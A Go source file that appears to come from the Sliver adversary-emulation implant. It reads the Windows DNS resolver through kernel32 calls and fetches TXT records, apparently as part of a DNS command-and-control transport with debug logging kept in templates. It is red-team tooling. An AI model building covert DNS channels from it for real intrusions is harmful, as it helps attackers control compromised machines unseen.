package transports

import (
	"context"
	// {{if .Debug}}
	"fmt"
	// {{end}}
	"log"
	"net"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/bishopfox/sliver/sliver/platform/win"
)

const (
	MEM_COMMIT  = 0x001000
	MEM_RESERVE = 0x002000
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func sysAlloc(size int) (uintptr, error) {
	n := uintptr(size)
	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, uintptr(syscall.PAGE_READWRITE))
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func toUint32Ptr(x uint32) *uint32 {
	return &x
}

func getDNSResolver() string {

	size := toUint32Ptr(uint32(5000))
	addr, _ := sysAlloc(5000)
	info := (win.PFIXED_INFO)(unsafe.Pointer(addr))
	ret := win.GetNetworkParams(info, size)
	// {{if .Debug}}
	log.Printf("Ret = %d\n", ret)
	log.Printf("Info = %s\n", info.DnsServerList.IpAddress)
	// {{end}}
	ip := fmt.Sprintf("%s", info.DnsServerList.IpAddress)
	ip = ip[1:strings.Index(ip, "\x00")]
	return ip
}

func dnsLookup(domain string) (string, error) {

	resolverIP := getDNSResolver()
	// {{if .Debug}}
	log.Printf("[dns] resolver ip: %#v", resolverIP)
	// {{end}}

	udpResolver := net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			dialer := net.Dialer{}
			return dialer.DialContext(ctx, "udp", fmt.Sprintf("%s:53", resolverIP))
		},
	}

	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	txts, err := udpResolver.LookupTXT(ctx, domain)
	if err != nil || len(txts) == 0 {
		// {{if .Debug}}
		log.Printf("[!] failure -> %s", domain)
		// {{end}}
		return "", err
	}
	return strings.Join(txts, ""), nil

}
